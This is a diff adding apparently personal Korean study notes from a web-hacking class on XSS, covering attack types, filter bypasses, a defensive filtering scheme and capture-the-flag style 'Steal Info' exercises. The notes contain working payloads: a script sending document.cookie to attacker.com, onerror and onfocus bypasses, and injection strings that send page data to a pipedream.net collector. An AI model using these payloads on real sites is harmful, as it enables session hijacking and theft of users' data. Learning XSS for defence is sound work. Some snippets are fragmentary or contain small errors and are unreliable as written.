@@ -1,0 +1,288 @@
+XSS
+
+3가지
+
+Stored XSS : 게시판.
+Reflected XSS : 검색 기능.
+GET Method, URL 전달하는 방식
+
+DOM Based XSS :
+브라우저의 자바스크립트를 통해 HTML 태그가 만들어지기도 함
+(클라이언트 측에서 조립되는 점에서 Reflected XSS랑 차이)
+
+DOM Based XSS :
+http://ejfweijf.com/sesarch=ef#
+#은 브라우저측에서 인식이 되지 않음
+
+** Cookie Steal
+www.google.com
+www.naver.com
+
+attacker.com/cookieSteal.php
+이건 안됨. 브라우저마다 이용하는 쿠키가 달라서.
+
+<script>
+var cookieData = document.cookie;
+
+// GET Image
+var i = new Image();
+i.src = "http://attacker.com/" + cookieData;
+
+</script>
+
+<img src="http://attacker.com/eifj">
+위의 링크로 들어가서 이미지를 로드하려고 할 것임
+위의 url에 들어가서 eifj 파일 주세요.
+
+__________________________________
+
+XSS 대응 방안.
+
+필터링이요! => 사용자의 입력을 제한.
+
+블랙 리스트 기반 필터링
+> 특정 단어를 못들어오게 하는 것.
+
+>>> 우회가 될 가능성이 존재한다.
+
+<script>aeofwijwaeiofj</script>
+
+<script>javascript~~~</script> -> 이게 원래 방식
+<script src="http://attacker.com/a.js"></script>
+위의 방식과 같이 외부에서 가져올 수 있음.
+
+script 글자를 없애기
+* 대소문자 혼용
+<ScRipT></ScrIpt>
+
+<script> => <>
+<scrscriptipt> => <script>
+
+<script> => xript 와 같이 막혀있으면?
+** image Tag
+<img src=x onerror="alert(1)">
+
+x라는 url에 들어가서 이미지를 가져오려고 할텐데
+x라는 url은 존재하지 않으니까 404 에러를 띄울 것임
+근데 error가 뜰때, onerror와 같은 이벤트 핸들러로 alert(1)을 띄움.
+
+Event Handler
+onload, onclick, onmouseover ...
+와 같은 이벤트 핸들러를 한번 정리하면 좋겠다.
+
+** href
+<a href="javascript:alert(1)">TEST</a>
+주소창에 javascript:alert(1)을 실행해도 뜸
+
+** Javascript 내에서 XSS < , >
+
+";alert(1);var a = "
+var+a+=""
+
+<script>
+  var data = "___";
+  var data = "";alert(1);var a = "";
+</script>
+
+** input XSS
+<input type="text" value="___">
+
+aaa"    ."
+꺽쇠가 html entity로 치환된다면,
+
+<input type="text" onmouseover="alert(1)">
+마우스가 올라가는 순간
+<input type="text" onfocus="alert(1)">
+커서가 들어가는 순간
+<input type="text" autofocus onfocus="alert(1)">
+포커스가 들어가는 순간
+
+
+등등 이와같은 방법으로 우회가 가능하기 때문에
+블랙리스트 기반은 우회가 가능한 방법이 존재.
+
+
+화이트 리스트 기반 필터링
+> 특정 단어만 들어오게 하는 것.
+
+- 게시판 -
+
+__________________________________
+
+* HTML 특수 문자 -> HTML Entity
+<
+>
+""
+''
+치환
+
+HTML Editor
+티스토리의 코드블럭 같은거
+-> XSS
+
+코드를 이쁘게 삽입하기 위한 기능인데
+<script>가 &lt;script&gt;로 바뀌면..
+
+> HTML Editor 기능 삭제.
+
+***********(꼭 기록해두고 정리해두세요.)
+
+1. 파라미터에서 HTML 특수문자들을 전부 HTML Entity로 치환
+
+2. 허용해줄 tag를 식별하고 그 tag를 다시 살린다.
+(화이트 리스트 기반)
+
+3. 살려준 tag 내에 악의적인 event Handler
+(블랙리스트 기반 필터링)
+
+위의 단계를 가끔씩 면접에서 물어봄
+
+img
+a
+h1
+h2
+h3
+
+&lt;img%gt;
+
+다른 곳에서는 HTML Entity를 이용하여 치환을 해주어도 되는데,
+HTML Editor 같은 경우는 3가지 과정을 거치면 된다.
+
+__________________________________
+Client script
+
+** Page Redirect
+
+<script>
+  location.href="https://attacker.com/"; -> 함수
+
+  location.replace("https://attacker.com/"); -> 주소에 값을 대입
+</script>
+
+location.replace() 새로 주소를 이동하는 것이기 때문에 뒤로가기 불가능.
+
+
+** 주소창 변조
+
+<script>
+  history.pushState(null, null, 'login.php');
+</script>
+
+맨 뒤의 도메인 파일명을 바꿀 수 있음.
+
+** DOM 객체 접근
+html 태그로 감싸진 코드 전체가 document.(내 피셜)
+document.cookie와 같이 접근을 할 수 있음
+
+document.getElement
+
+HTML
+
+<html>
+<h1 id="name" class="NameClass"></h1>
+
+</html>
+
+id 속성 : 유일
+class 속성 : 분류
+
+document.getElementById('userName')
+document.getElementsByClassName('card-title')[0];
+document.getElementsByClassName('card-title')[1];
+
+new Image();
+
+i.src=
+
+<img src="">
+와 같은 원리
+
+속성값 가져오기
+document.getElementById('userName').id
+document.getElementsByClassName('card-title').className;
+
+document.getElementById('userName').innerHTML
+
+LINK
+http://attacker.com/
+
+1. 마이페이지에는 XSS 취약점 존재.
+>> 찾아내고.
+
+2. Reflected XSS
+>> url
+http://~~~~
+링크에 접속했을 때, flag Here..!이 찍히도록 해보기.
+
+
+document.getElementsByName('info')[0].placeholder
+
+var secretData = document.getElementsByName('info')[0];
+var i = new Image();
+console.log(secretData);
+i.src="http://attacker.com"
+
+<burp에 추가할 코드>
+normaltic"><img+src=x+onerror="var+secretData=document.getElementsByName('info')[0].placeholder;console.log(secretData); 
+
+<html>
+
+<input>
+<script>
+  document.getElement~~~
+</script>
+<p>
+
+</html>
+
+자바스크립트 쓸 떄, 주의해야할 점
+실행했는데 안되네..(undefined)
+
+페이지가 다 로드 되지도 않았는데, script 태그가 실행이 된 것.
+자바스크립트 실행 시간.
+자바스크립트 나중에 로드 등
+검색을 해서 적용해야함.
+
+normaltic"><script>window.addEventListener('DOMContentLoaded',function(){var+secretData=document.getElementsByName('info')[0].placeholder;console.log(secretData);});</script><"
+
+var i = new Image();
+i.src=""+secretData;
+
+_________
+
+게시판
+
+iframe
+지금 페이지에서 다른 페이지를 하나 넣을 수 있음.
+현재 페이지에서 다른 페이지를 로드할 수 있음.
+
+<iframe src="http://~~~/mypage.php" ></iframe>
+
+이것을 실행시키면 또 다른 작은 페이지가 나옴
+여기에 어떻게 접근을 하냐.
+
+<iframe src="http://~~~/mypage.php" id="targetFrame"></iframe>
+고유값 특성을 가진 id를 하나 삽입
+
+<iframe src="http://~~~/mypage.php" id="targetFrame"></iframe>
+-> 임의로 id를 삽입
+
+<script>
+  var targetTag = document.getElementByID('targetFrame'); -> getElementByID로 데이터를 가져옴 그리고 targetTag에 넣었음
+  
+  var DOMData = targetTag.contentDocument; -> targetTag에는 Iframe이 있는데, 이 iframe 안에는 다른 웹페이지가 있음. 이것을 가져오는게 .contentDocument
+  DOMData.getElementByID('~~~'); -> iframe 안의 웹 페이지에 또 접근을 할 수가 있음.
+</script>
+
+normaltic"><img+src=x+onerror="var+secretData=document.getElementByName('info')[0].placeholder;var+i=new+Image();i.src="https://en819l26pm1lo.x.pipedream.net/?data="+secretData;console.log(secretData);
+
+* 과제
+1. 오늘 수업 내용 정리
+2. Basic Script Prac 문제 풀이!
+
+3. Steal Info, Steal Info2
+4. 문제풀이 블로그 정리
+
+5. 웹 개발.
+
+웹 경로 파일 압축 / DB export -> sql 파일
